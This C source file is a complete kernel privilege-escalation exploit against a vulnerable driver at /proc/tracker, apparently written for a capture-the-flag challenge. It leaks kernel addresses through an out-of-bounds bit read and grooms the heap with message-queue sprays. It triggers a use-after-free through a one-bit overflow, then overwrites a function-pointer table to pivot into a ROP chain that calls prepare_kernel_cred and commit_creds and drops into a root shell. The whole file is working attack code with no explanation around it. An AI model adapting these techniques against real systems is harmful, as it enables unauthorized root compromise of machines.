#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <inttypes.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/msg.h>

#define GET_GAME 0x1337
#define SET_NOTES 0x1338
#define RELEASE_GAME 0x1339
#define EXE_GAME 0x133a
#define MARK_ALIVE 0x133b
#define MARK_DEAD 0x133c
#define GET_STATUS 0x133d

//typedef struct {
//        refcount_t                 count;                /*     0     4 */
//        char                       name[16];             /*     4    16 */
//        char                       desc[135];            /*    20   135 */
//
//        /* XXX 5 bytes hole, try to pack */
//
//        /* --- cacheline 2 boundary (128 bytes) was 32 bytes ago --- */
//        state_t *                  state;                /*   160     8 */
//        gameops_t *                ops;                  /*   168     8 */
//        struct list_head           glist;                /*   176    16 */
//
//        /* size: 192, cachelines: 3, members: 6 */
//        /* sum members: 187, holes: 1, sum holes: 5 */
//} game_t;
//
//typedef struct __attribute__((packed)) {
//        char                       notes[135];           /*     0   135 */
//        /* --- cacheline 2 boundary (128 bytes) was 7 bytes ago --- */
//        uint8_t                    contestants[57];      /*   135    57 */
//
//        /* size: 192, cachelines: 3, members: 2 */
//} state_t;

#define BUFFSIZE 192-48

typedef struct
{
    char buf[135];
    uint32_t serial;
    long gamenum;
    long args;
    long contestant;
} request_t;

int fd;

// spray to make ops < state
void msg_send_spray() {
    struct {
        long mtype;
        char mtext[BUFFSIZE];
    } msg;

    memset(msg.mtext, 0x42, BUFFSIZE-1);
    msg.mtext[BUFFSIZE-1] = 0;
    msg.mtype = 1;

    int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);

    for(int i = 0; i < 40; i++)
        msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
}

// spray on top of freed game
void msg_send_spray2(unsigned long stateptr) {
    struct {
        long mtype;
        char mtext[BUFFSIZE];
    } msg;

    uint64_t buf[] = {
        0, 
        0, 
        0, 
        0, 
        0, 
        0, 
        0, 
        0, 
        0, 
        0, 
        0, 
        0, 
        0, 
        0, 
        0, 
        stateptr-(6*8),
    };

    memset(msg.mtext, 0, BUFFSIZE);
    memcpy(msg.mtext, buf, sizeof(buf));
    msg.mtype = 1;

    int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);

    for(int i = 0; i < 10; i++)
        msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
}

unsigned long leak(uint32_t ref, long offset) {
    unsigned long l = 0;
    request_t r;
    int ret;
    
    r.serial = ref; 
    for (int i = 0; i < 64; i++) {
        r.contestant = offset + i;

        if ((ret = ioctl(fd, GET_STATUS, &r))) {
            l |= ((long)1 << i);
        }
    }

    return l;
}

unsigned long user_cs, user_ss, user_rflags, user_rsp;
static void save_state() {
    asm(
    "movq %%cs, %0\n"
    "movq %%ss, %1\n"
    "movq %%rsp, %2\n"
    "pushfq\n"
    "popq %3\n"
    : "=r" (user_cs), "=r" (user_ss), "=r" (user_rsp), "=r" (user_rflags) :: "memory"
    );
}

int shell() {
    int res = system("/bin/sh");
    return res;
}

int main() {
    request_t r;
    
    save_state();
    msg_send_spray();

    fd = open("/proc/tracker", O_RDONLY);

    strcpy(r.buf, "AAAA");
    uint32_t ref1 = ioctl(fd, GET_GAME, &r);

    strcpy(r.buf, "BBBB");
    uint32_t ref2 = ioctl(fd, GET_GAME, &r);
    uint32_t ref3 = ioctl(fd, GET_GAME, &r);
    uint32_t ref4 = ioctl(fd, GET_GAME, &r);
    
    // leak ops
    unsigned long opptr = leak(ref1, (-135-16-8)*8);
    printf("OPs PTR: %lx\n", opptr);

    // leak state
    unsigned long stateptr = leak(ref1, (-135-16-8-8)*8);
    printf("STATE PTR: %lx\n", stateptr);

    // leak kernel base
    unsigned long textptr = leak(ref1, (opptr-stateptr-135+8)*8) - 0xdc690;
    printf("TEXT BASE: %lx\n", textptr);

    //0xffffffff815f040a : push rdi ; add byte ptr [rcx + 0x415d5be8], cl ; pop rsp ; ret
    //0xffffffff81001508 : pop rdi ; ret
    //0xffffffff8108bbc0 T prepare_kernel_cred
    //0xffffffff8105e9ed : pop rcx ; ret
    //0xffffffff813f9ee6 : mov rdi, rax ; cmp rcx, rsi ; ja 0xffffffff813f9ed9 ; ret
    //0xffffffff8108b920 T commit_creds
    //0xffffffff81c00df0 T swapgs_restore_regs_and_return_to_usermode

    uint64_t rop_chain[] = {
        textptr+0x5f040a,   // pivot gadget
        textptr+0x1508,     // ropchain starts here
        0,
        textptr+0x8bbc0,
        textptr+0x5e9ed,
        0,
        textptr+0x3f9ee6,
        textptr+0x8b920,
        textptr+0xc00df0+22,
        0, // dummy
        0, // dummy
        (uintptr_t) shell,
        user_cs,
        user_rflags,
        user_rsp,
        user_ss,
    };

    r.serial = ref1;
    memcpy(r.buf, rop_chain, sizeof(rop_chain));
    ioctl(fd, SET_NOTES, &r);

    // trigger 1-bit OOB
    r.contestant = 456;
    ioctl(fd, MARK_DEAD, &r);

    // trigger free() of second game
    // UAF -> still have ref2
    r.serial = ref3;
    ioctl(fd, RELEASE_GAME, &r);

    r.serial = ref4;
    ioctl(fd, RELEASE_GAME, &r);

    // Overwrite fops
    msg_send_spray2(stateptr);

    // Execute function ptr
    r.serial = ref2;
    r.gamenum = stateptr-0x415d5be8; // set rcx of pivot gadget
    r.args = stateptr+8;
    ioctl(fd, EXE_GAME, &r);

    return 0;
}
